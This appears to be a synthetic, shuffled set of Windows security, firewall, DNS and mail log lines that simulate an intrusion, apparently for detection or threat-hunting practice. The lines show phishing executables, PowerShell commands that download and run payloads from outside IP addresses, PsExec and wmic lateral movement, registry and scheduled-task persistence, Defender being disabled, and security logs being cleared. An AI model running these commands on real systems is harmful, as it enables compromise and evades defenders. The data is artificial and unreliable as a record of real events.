+2024-12-20 19:00:00 192.168.1.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.100, AccountName=Administrator
+2024-12-20 22:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_25.exe
+2024-12-20 16:00:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 06:00:00 192.168.1.100[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 12:50:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 10:00:00 172.16.0.100[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-21 00:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 13:40:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 13:50:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 15:00:00 WIN-APP-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-21 01:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 10:00:00 172.16.0.100[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.50 cmd.exe
+2024-12-21 00:00:00 192.168.1.50[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 13:00:00 192.168.1.200[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.50, AccountName=Administrator
+2024-12-20 21:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 15:50:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 16:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 22:00:00 192.168.1.50[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 10:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 18:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: invoice_16.doc.exe, Attachment: malicious_16.exe
+2024-12-20 11:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-21 06:00:00 192.168.1.50[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://185.220.101.46/payload.ps1'))"
+2024-12-20 22:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-21 02:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.200, AccountName=Administrator
+2024-12-20 16:10:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 18:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 13:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_6.exe"
+2024-12-20 10:10:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 19:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 13:20:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 18:00:00 192.168.1.50[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 23:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 15:00:00 172.16.0.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 21:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Invoice #22 - Payment Required, Attachment: malicious_22.exe
+2024-12-20 11:50:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 04:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 14:00:00 192.168.1.100[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 14:00:00 172.16.0.100[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 22:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 22:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 14:50:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:00:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 15:00:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 18:10:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 10:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_1.xls.exe, Attachment: malicious_1.exe
+2024-12-20 13:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 11:00:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_5.exe"
+2024-12-21 04:00:00 10.0.0.55[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://185.220.101.46/payload.ps1'))"
+2024-12-20 10:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 11:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 20:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_21.exe"
+2024-12-20 13:00:00 192.168.1.50[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.200 cmd.exe
+2024-12-20 21:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 22:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-21 22:00:00 172.16.0.100[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 14:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 17:30:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 04:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 19:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 12:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_5.pdf.exe, Attachment: malicious_5.exe
+2024-12-20 22:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 14:30:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 13:00:00 192.168.1.50[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.200 process call create "powershell.exe -c ..."
+2024-12-20 11:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_2.exe"
+2024-12-21 01:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 15:00:00 WIN-APP-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 14:00:00 WIN-APP-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-21 10:00:00 192.168.1.200[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 21:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_23.exe
+2024-12-21 01:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 13:30:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 04:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 23:00:00 172.16.0.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.200 process call create "powershell.exe -c ..."
+2024-12-20 14:20:00 WIN-APP-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 15:30:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:10:00 WIN-APP-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 05:00:00 192.168.1.100[Security]: EventID=4688 PsExec.exe -s -d \10.0.0.55 cmd.exe
+2024-12-20 20:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_20.pdf.exe, Attachment: malicious_20.exe
+2024-12-20 19:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 13:10:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 02:00:00 192.168.1.200[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://91.121.87.18/payload.ps1'))"
+2024-12-20 22:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:40:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 16:20:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 04:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 23:00:00 192.168.1.200[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=172.16.0.100, AccountName=Administrator
+2024-12-20 18:00:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 13:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 14:00:00 WIN-APP-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 13:00:00 WIN-WEB-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 00:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_28.exe"
+2024-12-20 14:00:00 192.168.1.100[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-20 13:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 10:00:00 172.16.0.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.50 process call create "powershell.exe -c ..."
+2024-12-20 16:00:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 21:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 20:00:00 172.16.0.100[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 11:30:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 20:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 17:50:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 18:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 16:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 10:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 21:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.50, AccountName=Administrator
+2024-12-20 13:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 14:00:00 192.168.1.200[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 15:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-21 02:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-21 08:00:00 10.0.0.55[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 12:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_4.exe"
+2024-12-21 00:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 10:10:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 15:40:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 14:00:00 WIN-SQL-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 00:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 12:20:00 WIN-WEB-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 11:30:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 14:00:00 192.168.1.100[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 15:10:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 18:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_17.exe"
+2024-12-20 20:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 16:20:00 WIN-APP-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 19:00:00 WIN-APP-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 18:00:00 WIN-APP-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 16:20:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 18:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 15:20:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 11:00:00 192.168.1.200[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.200 cmd.exe
+2024-12-20 12:00:00 192.168.1.50[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.50 cmd.exe
+2024-12-20 13:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_7.exe"
+2024-12-20 19:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_19.exe"
+2024-12-20 17:40:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 01:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-21 10:00:00 192.168.1.200[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-21 07:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-21 05:00:00 192.168.1.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:10.0.0.55 process call create "powershell.exe -c ..."
+2024-12-20 15:00:00 WIN-WEB-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 02:00:00 192.168.1.200[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 19:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 10:40:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 10:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-21 03:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 17:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 12:00:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 15:40:00 WIN-WEB-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:30:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 03:00:00 192.168.1.200[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.50, AccountName=Administrator
+2024-12-20 17:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 16:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 13:50:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 06:00:00 192.168.1.100[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 19:00:00 192.168.1.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.100 process call create "powershell.exe -c ..."
+2024-12-20 16:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-21 16:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 22:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 23:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_27.exe"
+2024-12-21 04:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 13:20:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:00:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 20:00:00 172.16.0.100[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://103.35.74.12/payload.ps1'))"
+2024-12-20 13:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-21 13:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-21 07:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-21 14:00:00 192.168.1.100[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 18:00:00 10.0.0.55[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-20 11:00:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 15:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: report_10.xls.exe, Attachment: malicious_10.exe
+2024-12-20 15:10:00 WIN-APP-01[Network]: CONNECT http://23.129.64.213:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-21 03:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 12:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 16:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 14:20:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 11:20:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 20:00:00 WIN-APP-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 15:00:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 11:30:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 23:00:00 172.16.0.100[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.200 cmd.exe
+2024-12-20 15:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 14:00:00 192.168.1.100[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-21 10:00:00 172.16.0.100[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 20:00:00 WIN-APP-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 22:00:00 192.168.1.200[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-21 04:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 10:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_1.exe"
+2024-12-20 18:00:00 10.0.0.55[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 17:00:00 192.168.1.100[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-21 04:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-21 00:00:00 192.168.1.200[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-20 16:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_13.exe"
+2024-12-21 16:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 10:00:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 15:20:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 11:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_3.exe"
+2024-12-21 01:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 19:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 15:00:00 WIN-APP-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 16:00:00 172.16.0.100[Security]: EventID=4688 PsExec.exe -s -d \10.0.0.55 cmd.exe
+2024-12-20 20:00:00 WIN-APP-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 15:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 01:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:00:00 172.16.0.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:10.0.0.55 process call create "powershell.exe -c ..."
+2024-12-20 19:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_18.exe"
